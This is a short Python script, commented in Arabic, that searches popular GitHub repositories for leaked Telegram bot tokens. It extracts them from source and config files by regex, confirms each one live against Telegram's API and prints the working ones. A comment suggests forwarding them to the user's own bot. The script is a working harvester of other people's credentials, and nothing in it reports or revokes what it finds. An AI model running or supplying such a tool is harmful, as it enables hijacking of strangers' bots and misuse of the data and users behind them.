import os
import asyncio
import aiohttp
from github import Github

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

async def validate_token(session, token):
    """التحقق من صحة التوكن عبر API تيليجرام"""
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        async with session.get(url, timeout=5) as resp:
            if resp.status == 200:
                return await resp.json()
    except Exception:
        return None
    return None

async def scanner_logic():
    print("Zero Scanner: بدأت عملية البحث عن المستودعات ذات الجودة العالية...")
    
    # البحث عن مستودعات ذات نجوم عالية (أكبر من 50 نجمة) لضمان النشاط
    repositories = g.search_repositories(query="telegram bot token", sort="stars", order="desc")
    
    async with aiohttp.ClientSession() as session:
        for repo in repositories[:20]:  # فحص أفضل 20 مستودع في البحث
            if repo.stargazers_count < 50:
                continue
            
            print(f"جاري فحص: {repo.full_name} | النجوم: {repo.stargazers_count}")
            
            try:
                # البحث عن ملفات تحتوي على احتمالية وجود توكن
                contents = repo.get_contents("")
                for content in contents:
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml')):
                        file_content = content.decoded_content.decode('utf-8')
                        
                        # منطق بسيط لاستخراج التوكن (يمكنك تحسينه بالـ Regex)
                        # ابحث عن الأنماط التي تشبه توكنات تيليجرام
                        import re
                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                        
                        for token in tokens:
                            result = await validate_token(session, token)
                            if result:
                                print(f"✅ توكن صالح وجديد: {token}")
                                # هنا يمكنك إضافة كود إرسال النتيجة لبوت التيليجرام الخاص بك
            except Exception as e:
                continue
            
            # تأخير بسيط لتجنب حظر الـ API
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(scanner_logic())
